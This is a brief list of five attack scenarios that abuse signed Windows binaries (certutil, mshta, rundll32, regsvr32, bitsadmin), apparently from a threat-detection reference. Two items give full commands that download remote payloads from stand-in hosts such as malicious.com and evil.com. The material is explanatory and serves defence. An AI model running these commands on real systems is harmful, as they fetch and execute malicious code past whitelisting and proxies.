## Common Scenarios

1. **Certutil Download Cradle**: Adversary uses `certutil.exe -urlcache -split -f http://malicious.com/payload.exe` to download malware, bypassing web proxies that allow certutil traffic.
2. **Mshta HTA Execution**: Attacker delivers HTA file via email that executes VBScript payload through `mshta.exe`, which is a signed Microsoft binary.
3. **Rundll32 DLL Proxy Load**: Malicious DLL loaded via `rundll32.exe shell32.dll,ShellExec_RunDLL` to proxy execution through a trusted binary.
4. **Regsvr32 Squiblydoo**: Remote SCT file executed via `regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll` bypassing application whitelisting.
5. **BITSAdmin Persistence**: Adversary creates BITS transfer job to repeatedly download and execute payloads using `bitsadmin /transfer`.
